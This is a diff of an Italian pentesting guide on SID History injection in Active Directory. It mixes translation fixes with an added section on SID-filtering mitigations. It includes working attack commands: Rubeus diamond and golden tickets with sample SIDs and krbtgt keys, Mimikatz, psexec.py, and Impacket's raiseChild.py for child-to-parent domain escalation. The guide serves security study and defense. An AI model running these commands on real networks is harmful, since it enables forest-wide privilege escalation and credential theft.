@@ -4,7 +4,7 @@
 
 ## Attacco di Iniezione della Storia SID
 
-L'obiettivo dell'**Attacco di Iniezione della Storia SID** è facilitare **la migrazione degli utenti tra domini** garantendo al contempo l'accesso continuo alle risorse del precedente dominio. Questo viene realizzato **incorporando il precedente Identificatore di Sicurezza (SID) dell'utente nella Storia SID** del loro nuovo account. È importante notare che questo processo può essere manipolato per concedere accesso non autorizzato aggiungendo il SID di un gruppo ad alta privilegio (come Enterprise Admins o Domain Admins) dalla parent domain alla Storia SID. Questa sfruttamento conferisce accesso a tutte le risorse all'interno del dominio parent.
+L'obiettivo dell'**Attacco di Iniezione della Storia SID** è facilitare **la migrazione degli utenti tra domini** garantendo al contempo l'accesso continuo alle risorse del precedente dominio. Questo viene realizzato **incorporando il precedente Identificatore di Sicurezza (SID) dell'utente nella Storia SID** del loro nuovo account. È importante notare che questo processo può essere manipolato per concedere accesso non autorizzato aggiungendo il SID di un gruppo ad alta privilegio (come gli Enterprise Admins o i Domain Admins) dal dominio principale alla Storia SID. Questa sfruttamento conferisce accesso a tutte le risorse all'interno del dominio principale.
 
 Esistono due metodi per eseguire questo attacco: attraverso la creazione di un **Golden Ticket** o di un **Diamond Ticket**.
 
@@ -13,8 +13,36 @@ Per individuare il SID per il gruppo **"Enterprise Admins"**, è necessario prim
 Puoi anche utilizzare i gruppi **Domain Admins**, che termina in **512**.
 
 Un altro modo per trovare il SID di un gruppo dell'altro dominio (ad esempio "Domain Admins") è con:
-```powershell
+```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
+```
+> [!WARNING]
+> Nota che è possibile disabilitare la cronologia SID in una relazione di fiducia, il che farà fallire questo attacco.
+
+Secondo la [**documentazione**](https://technet.microsoft.com/library/cc835085.aspx):
+- **Disabilitare SIDHistory su trust di foresta** utilizzando lo strumento netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Applicare il quarantining del filtro SID a trust esterni** utilizzando lo strumento netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Applicare il filtro SID a trust di dominio all'interno di una singola foresta** non è raccomandato poiché è una configurazione non supportata e può causare cambiamenti critici. Se un dominio all'interno di una foresta non è affidabile, allora non dovrebbe essere un membro della foresta. In questa situazione è necessario prima separare i domini fidati e non fidati in foreste separate dove il filtro SID può essere applicato a un trust interforesta.
+
+Controlla questo post per ulteriori informazioni su come bypassare questo: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+
+### Diamond Ticket (Rubeus + KRBTGT-AES256)
+
+L'ultima volta che ho provato questo ho dovuto aggiungere l'argomento **`/ldap`**.
+```bash
+# Use the /sids param
+Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
+
+# Or a ptt with a golden ticket
+## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
+## The /printcmd option will print the complete command if later you want to generate a token offline
+Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd
+
+#e.g.
+
+execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd
+
+# You can use "Administrator" as username or any other string
 ```
 ### Golden Ticket (Mimikatz) con KRBTGT-AES256
 ```bash
@@ -33,22 +61,13 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-Per ulteriori informazioni sui golden ticket controlla:
+Per ulteriori informazioni sui golden tickets controlla:
 
 {{#ref}}
 golden-ticket.md
 {{#endref}}
 
-### Diamond Ticket (Rubeus + KRBTGT-AES256)
-```powershell
-# Use the /sids param
-Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
 
-# Or a ptt with a golden ticket
-Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt
-
-# You can use "Administrator" as username or any other string
-```
 Per ulteriori informazioni sui diamond tickets controlla:
 
 {{#ref}}
@@ -101,19 +120,19 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 ```
 #### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-Questo è uno script Impacket che **automatizza l'innalzamento da un dominio figlio a un dominio genitore**. Lo script richiede:
+Questo è uno script Impacket che **automatizza l'innalzamento dal dominio child al dominio parent**. Lo script richiede:
 
-- Controller di dominio di destinazione
-- Credenziali per un utente admin nel dominio figlio
+- Domain controller di destinazione
+- Credenziali per un utente admin nel dominio child
 
 Il flusso è:
 
-- Ottiene il SID per il gruppo Enterprise Admins del dominio genitore
-- Recupera l'hash per l'account KRBTGT nel dominio figlio
+- Ottiene il SID per il gruppo Enterprise Admins del dominio parent
+- Recupera l'hash per l'account KRBTGT nel dominio child
 - Crea un Golden Ticket
-- Effettua il login nel dominio genitore
-- Recupera le credenziali per l'account Administrator nel dominio genitore
-- Se l'opzione `target-exec` è specificata, si autentica al Domain Controller del dominio genitore tramite Psexec.
+- Effettua il login nel dominio parent
+- Recupera le credenziali per l'account Administrator nel dominio parent
+- Se l'opzione `target-exec` è specificata, si autentica al Domain Controller del dominio parent tramite Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
